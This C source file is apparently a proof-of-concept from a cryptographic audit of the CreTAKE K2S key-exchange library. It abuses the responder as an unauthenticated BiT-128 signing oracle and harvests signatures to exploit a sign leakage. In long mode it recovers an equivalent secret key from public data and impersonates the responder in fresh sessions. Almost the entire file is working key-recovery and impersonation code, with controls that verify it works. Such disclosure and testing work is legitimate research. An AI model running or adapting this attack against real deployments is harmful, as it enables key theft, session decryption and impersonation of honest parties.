/*
 * kex-03-9: the CreTAKE K2S responder is an unauthenticated BiT-128 signing
 * oracle, and the embedded BiT-128 signer has the shared-sign leakage of
 * sign-02-2.
 *
 * This driver dlopens the prebuilt CreTAKE K2S library and obtains every
 * signature exclusively through kex_generate_pass2_msg_b. It is compiled
 * against CreTAKE's own Common/primitives/sig/BiT-128 sources and includes
 * attack_core.c, which the wrapper script derives at run time from Martin
 * Feussner's bit_global_sign.c (NGCC-Signature-Audit, commit 91f2ddf) by
 * renaming its main(). The recovery statistic, the public low-confidence
 * search and the equivalent-key completion are Feussner's code, unmodified.
 *
 *   short <lib> <n>                harvest n signatures, verify oracle and
 *                                  shared-sign property (default run)
 *   long  <lib> <n> <search-bits>  harvest n, recover an equivalent key from
 *                                  public data, impersonate the responder
 *
 * In short mode Bob's secret key is unpacked only to evaluate the leak
 * (ground truth); in long mode it is passed only to the honest pass-2 calls.
 */
#include "attack_core.c"
#include <dlfcn.h>

typedef unsigned long long ull;
typedef int (*init_fn)(unsigned char *, ull *, unsigned char *, ull *, unsigned char *, ull *);
typedef int (*p1_fn)(unsigned char *, ull, unsigned char *, ull, unsigned char *, ull *, unsigned char *, ull *);
typedef int (*pn_fn)(unsigned char *, ull, unsigned char *, ull, unsigned char *, ull, unsigned char *, ull *, unsigned char *, ull *);
typedef int (*dv_fn)(unsigned char *, ull, unsigned char *, ull, unsigned char *, ull, unsigned char *, ull, unsigned char *, ull *);
typedef ull (*len_fn)(void);
typedef int (*seed_fn)(const unsigned char *, ull);
typedef int (*sv_fn)(unsigned char *, ull, unsigned char *, ull, unsigned char *, ull);

#define SYM(T, n) T n = (T)dlsym(h, #n); if (!n) { fprintf(stderr, "missing %s\n", #n); return 2; }

static unsigned char pkA[1 << 15], skA[1 << 15], pkB[1 << 15], skB[1 << 15], pkO[1 << 15], skO[1 << 15];
static unsigned char st[1 << 16], tmp[1 << 16], m1[1 << 16], m2[1 << 16], sta[1 << 16], stb[1 << 16];

static uint64_t xs = 0x9e3779b97f4a7c15ULL;
static unsigned char rnd8(void) { xs ^= xs << 13; xs ^= xs >> 7; xs ^= xs << 17; return (unsigned char)(xs >> 24); }

/* Ground-truth secret rows (evaluation only, short mode). */
static void secret_rows(const unsigned char *sk, polyvecl *s) {
    unsigned char seed_A[BIT_SEEDBYTES], ss[BIT_SEEDBYTES], tr[BIT_TRBYTES];
    polyveck b1, e, b0;
    unpack_sk(seed_A, &b1, ss, tr, s, &e, &b0, sk);
}

static double pearson(const double *x, const double *y, int n) {
    double sx = 0, sy = 0, sxx = 0, syy = 0, sxy = 0;
    for (int i = 0; i < n; i++) { sx += x[i]; sy += y[i]; sxx += x[i] * x[i]; syy += y[i] * y[i]; sxy += x[i] * y[i]; }
    double cov = sxy - sx * sy / n, vx = sxx - sx * sx / n, vy = syy - sy * sy / n;
    return cov / sqrt(vx * vy);
}

int main(int argc, char **argv) {
    if (argc < 4) { fprintf(stderr, "usage: %s short|long lib n [search-bits]\n", argv[0]); return 2; }
    int longmode = strcmp(argv[1], "long") == 0;
    const char *libpath = argv[2];
    long target = strtol(argv[3], NULL, 10);
    int search_bits = argc > 4 ? atoi(argv[4]) : 24;
    if (fft_self_test() != 0) { fprintf(stderr, "negacyclic FFT self-test failed\n"); return 2; }
    void *h = dlopen(libpath, RTLD_NOW | RTLD_LOCAL);
    if (!h) { fprintf(stderr, "%s\n", dlerror()); return 2; }
    SYM(seed_fn, ngcc_seed) SYM(init_fn, kex_init_a) SYM(init_fn, kex_init_b)
    SYM(p1_fn, kex_generate_pass1_msg_a) SYM(pn_fn, kex_generate_pass2_msg_b)
    SYM(dv_fn, kex_derive_ss_a) SYM(dv_fn, kex_derive_ss_b) SYM(sv_fn, sig_verify)
    SYM(len_fn, kex_get_ss_len_bytes) SYM(len_fn, kem_get_pk_len_bytes)

    ull KL = kex_get_ss_len_bytes(), PKI = kem_get_pk_len_bytes();
    unsigned char seed[48];
    for (int i = 0; i < 48; i++) seed[i] = (unsigned char)(i * 7 + 1);
    ngcc_seed(seed, sizeof seed);
    ull pal, sal, pbl, sbl, pol, sol, stl, m1l, m2l, stal, stbl;
    if (kex_init_a(pkA, &pal, skA, &sal, st, &stl) || kex_init_b(pkB, &pbl, skB, &sbl, st, &stl)) return 2;
    if (pbl != BIT_PUBLICKEYBYTES || sbl != BIT_SECRETKEYBYTES) { fprintf(stderr, "BiT-128 size mismatch\n"); return 2; }
    if (kex_init_b(pkO, &pol, skO, &sol, st, &stl)) return 2;   /* unrelated BiT key (control) */
    printf("lib=%s mode=%s signatures=%ld pk_B=%llu sig=%d\n", libpath, argv[1], target, pbl, BIT_SIGNBYTES);

    /* 1. Oracle: responder signs arbitrary first messages for any claimed initiator key. */
    int acc = 0, ver = 0, distinct = 0, tamper_rej = 0;
    unsigned char prev[BIT_SIGNBYTES] = {0};
    if (kex_generate_pass1_msg_a(skA, sal, pkB, pbl, sta, &stal, m1, &m1l)) return 2;
    for (int q = 0; q < 20; q++) {
        unsigned char junk[1 << 12];
        for (ull i = 0; i < m1l; i++) junk[i] = rnd8();       /* not a generated KEM key */
        if (kex_generate_pass2_msg_b(skB, sbl, pkA, PKI, junk, m1l, stb, &stbl, m2, &m2l) != 1) continue;
        acc++;
        ull off = m2l - BIT_SIGNBYTES;
        memcpy(tmp, junk, m1l); memcpy(tmp + m1l, m2, off);
        ver += sig_verify(pkB, pbl, m2 + off, BIT_SIGNBYTES, tmp, m1l + off) == 0;
        distinct += memcmp(prev, m2 + off, BIT_SIGNBYTES) != 0; memcpy(prev, m2 + off, BIT_SIGNBYTES);
        tmp[0] ^= 1;
        tamper_rej += sig_verify(pkB, pbl, m2 + off, BIT_SIGNBYTES, tmp, m1l + off) != 0;
    }
    printf("oracle: random first messages accepted=%d/20, signatures valid under pk_B=%d/20, distinct=%d/20\n", acc, ver, distinct);
    printf("control: signature on a changed message rejected=%d/20\n", tamper_rej);
    if (acc != 20 || ver != 20 || distinct != 20 || tamper_rej != 20) return 1;

    /* 2. Harvest through the protocol and accumulate Feussner's public statistic. */
    polyvecl sB, sO;
    cpx SB[BIT_L][BIT_N], SO[BIT_L][BIT_N];
    if (!longmode) {
        secret_rows(skB, &sB); secret_rows(skO, &sO);
        for (int r = 0; r < BIT_L; r++) { negacyclic_forward_i16(sB.vec[r].coeffs, SB[r]); negacyclic_forward_i16(sO.vec[r].coeffs, SO[r]); }
    }
    static cpx numerator[BIT_L][BIT_N]; static double denominator[BIT_N], estimate[BIT_L][BIT_N];
    /* Control statistic: the same regression, but each signature's rows are
     * weighted with the sign posterior of the previous signature's z0. */
    static cpx num_x[BIT_L][BIT_N]; static double den_x[BIT_N], est_x[BIT_L][BIT_N];
    double w_prev = 0.0;
    long agreeB[BIT_L] = {0}, agreeO[BIT_L] = {0}, used = 0;
    polyvecl candidate; polyveck hh; unsigned char challenge[BIT_CHALLENGEBYTES];
    clock_t start = clock();
    for (long t = 0; t < target; t++) {
        if (kex_generate_pass2_msg_b(skB, sbl, pkA, PKI, m1, m1l, stb, &stbl, m2, &m2l) != 1) { fprintf(stderr, "pass2 failed at %ld\n", t); return 2; }
        const unsigned char *sig = m2 + m2l - BIT_SIGNBYTES;
        polyvecm1 z; poly c; cpx C[BIT_N], Z[BIT_N], Q[BIT_L][BIT_N];
        if (unpack_sig(&z, &hh, challenge, sig) != 0) return 2;
        poly_challenge(&c, challenge);
        double w = sign_posterior(&z, &c);                 /* public: from z0 only */
        negacyclic_forward_i16(c.coeffs, C);
        for (int k = 0; k < BIT_N; k++) {
            double c2 = C[k].re * C[k].re + C[k].im * C[k].im;
            denominator[k] += w * w * c2; den_x[k] += w_prev * w_prev * c2;
        }
        for (int row = 0; row < BIT_L; row++) {
            negacyclic_forward_i16(z.vec[row + 1].coeffs, Z);
            for (int k = 0; k < BIT_N; k++) {
                Q[row][k] = c_mul(c_conj(C[k]), Z[k]);
                numerator[row][k].re += w * Q[row][k].re; numerator[row][k].im += w * Q[row][k].im;
                num_x[row][k].re += w_prev * Q[row][k].re; num_x[row][k].im += w_prev * Q[row][k].im;
            }
        }
        w_prev = w;
        used++;
        if (!longmode) {
            /* <z_row, c*s_row> = Re sum conj(S) conj(C) Z / N; its sign follows the shared sign b. */
            for (int row = 0; row < BIT_L; row++) {
                double tb = 0, to = 0;
                for (int k = 0; k < BIT_N; k++) {
                    tb += SB[row][k].re * Q[row][k].re + SB[row][k].im * Q[row][k].im;
                    to += SO[row][k].re * Q[row][k].re + SO[row][k].im * Q[row][k].im;
                }
                agreeB[row] += (tb > 0) == (w > 0);
                agreeO[row] += (to > 0) == (w > 0);
            }
        }
    }
    double cpu = (double)(clock() - start) / CLOCKS_PER_SEC;
    printf("harvested=%ld signatures through kex_generate_pass2_msg_b cpu=%.1fs\n", used, cpu);

    if (!longmode) {
        int ok = 1;
        for (int row = 0; row < BIT_L; row++) {
            double fb = (double)agreeB[row] / used, fo = (double)agreeO[row] / used;
            double zb = (fb - 0.5) * 2.0 * sqrt((double)used), zo = (fo - 0.5) * 2.0 * sqrt((double)used);
            printf("shared sign row %d: P[sign <z_%d,c*s_%d> == sign of z0 posterior] = %.4f (z=%.1f); unrelated key %.4f (z=%.1f)\n",
                   row, row + 1, row, fb, zb, fo, zo);
            ok &= zb > 10.0 && zb > 2.0 * fabs(zo);
        }
        polyvecl cand_x;
        recover_candidate(num_x, den_x, &cand_x, est_x);
        recover_candidate(numerator, denominator, &candidate, estimate);
        static double est[BIT_L * BIT_N], ex[BIT_L * BIT_N], tb[BIT_L * BIT_N], to[BIT_L * BIT_N];
        long match = 0, zero = 0;
        for (int r = 0; r < BIT_L; r++) for (int j = 0; j < BIT_N; j++) {
            int i = r * BIT_N + j;
            est[i] = estimate[r][j]; ex[i] = est_x[r][j]; tb[i] = sB.vec[r].coeffs[j]; to[i] = sO.vec[r].coeffs[j];
            match += candidate.vec[r].coeffs[j] == sB.vec[r].coeffs[j];
            zero += sB.vec[r].coeffs[j] == 0;
        }
        double rb = pearson(est, tb, BIT_L * BIT_N), ro = pearson(est, to, BIT_L * BIT_N);
        double rx = pearson(ex, tb, BIT_L * BIT_N);
        printf("public regression after %ld signatures (Feussner statistic): corr(estimate, s_B)=%.3f; "
               "rounded coefficients equal to s_B: %ld/%d (all-zero guess %ld/%d)\n",
               used, rb, match, BIT_L * BIT_N, zero, BIT_L * BIT_N);
        printf("control: corr(estimate, unrelated key)=%.3f; corr with s_B when each signature uses the previous signature's sign posterior=%.3f\n",
               ro, rx);
        ok &= rb > 0.5 && fabs(ro) < 0.15 && fabs(rx) < 0.15 && match > zero + 100;
        printf("RESULT short %s\n", ok ? "LEAK" : "NO-LEAK");
        return ok ? 0 : 1;
    }

    /* 3. Long mode: public recovery of an equivalent key, then impersonation. */
    unsigned char esk[BIT_SECRETKEYBYTES]; int nz = 0;
    recover_candidate(numerator, denominator, &candidate, estimate);
    int ok = complete_equivalent_key(pkB, &candidate, esk, &nz) == 0;
    printf("public-key-check=%s\n", ok ? "PASS" : "fail");
    if (!ok && search_bits > 0) {
        polyvecl corrected; uint64_t tested = 0;
        ok = public_low_confidence_search(pkB, &candidate, estimate, search_bits, &corrected, esk, &tested, &nz) == 0;
        printf("public low-confidence correction tested=%llu result=%s\n", (unsigned long long)tested, ok ? "PASS" : "fail");
    }
    if (!ok) { printf("RESULT no equivalent key after %ld signatures\n", used); return 1; }
    printf("equivalent key recovered; differs from sk_B: %s\n", memcmp(esk, skB, BIT_SECRETKEYBYTES) ? "yes" : "no");
    int succ = 0, trials = 5;
    for (int tr = 0; tr < trials; tr++) {
        static unsigned char m1h[1 << 16], m2h[1 << 16], stH[1 << 16], staH[1 << 16];
        ull sl2 = 0, m1hl = 0, stHl = 0, m2hl = 0, ssl = 0, sskl = 0; unsigned char ssA[256], ssE[256];
        if (kex_generate_pass1_msg_a(skA, sal, pkB, pbl, staH, &sl2, m1h, &m1hl)) return 2;   /* honest Alice */
        if (kex_generate_pass2_msg_b(esk, BIT_SECRETKEYBYTES, pkA, PKI, m1h, m1hl, stH, &stHl, m2h, &m2hl) != 1) return 2;
        if (kex_derive_ss_b(esk, BIT_SECRETKEYBYTES, pkA, PKI, m1h, m1hl, stH, stHl, ssE, &sskl)) return 2;
        int rcA = kex_derive_ss_a(skA, sal, pkB, pbl, m2h, m2hl, staH, sl2, ssA, &ssl);
        succ += rcA == 0 && ssl == KL && sskl == KL && memcmp(ssA, ssE, KL) == 0;
    }
    printf("impersonation: Alice accepted and attacker knows her key in %d/%d fresh sessions\n", succ, trials);
    {
        static unsigned char m1h[1 << 16], m2h[1 << 16], stH[1 << 16], staH[1 << 16];
        ull sl2 = 0, m1hl = 0, stHl = 0, m2hl = 0, ssl = 0; unsigned char ss3[256];
        kex_generate_pass1_msg_a(skA, sal, pkB, pbl, staH, &sl2, m1h, &m1hl);
        kex_generate_pass2_msg_b(skO, sol, pkA, PKI, m1h, m1hl, stH, &stHl, m2h, &m2hl);
        int rcC = kex_derive_ss_a(skA, sal, pkB, pbl, m2h, m2hl, staH, sl2, ss3, &ssl);
        printf("control: unrelated BiT key in place of the equivalent key: Alice derive rc=%d (%s)\n", rcC, rcC ? "REJECTED" : "ACCEPTED");
        printf("RESULT long impersonation %d/%d\n", succ, trials);
        return succ == trials && rcC != 0 ? 0 : 1;
    }
}
